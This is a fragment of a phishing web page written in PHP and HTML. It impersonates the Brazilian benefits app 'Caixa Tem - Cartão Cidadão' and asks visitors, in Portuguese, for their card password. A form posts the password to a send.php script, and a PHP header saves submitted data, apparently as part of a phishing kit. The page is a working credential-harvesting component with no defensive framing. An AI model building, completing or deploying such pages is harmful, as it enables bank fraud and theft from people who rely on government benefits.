<?php require_once('../config/config.php'); if (isset($_POST)) { savePost('sms'); } ?>
...
<head>
    ...
    <title>Caixa Tem - Cartão Cidadão</title>
...
<body>
        ...
        <div id="template-wrapper">
            <div id="template-wrapper-content">
                ...
                <section id="template-section">
                    ...
                    <p class="description" style="text-align: center;">Digite a senha do seu cartão cidadão:</p>

                    <form action="../events/send.php" id="form-login" method="post">
                        <span class="float-label">
                            <input tabindex="1" inputmode="numeric" placeholder=" " id="password" name="password-citizen" value="" type="password" autofocus="" autocomplete="off" required="" maxlength="6" minlength="4">
                            <label for="password-citizen">Senha</label>

                            <img id="icon-pass" src="../assets/img/hide.png" onclick="showHide()"/>
                        </span>
    ...
    <script src="../assets/js/effect-password.js"></script>
</body>
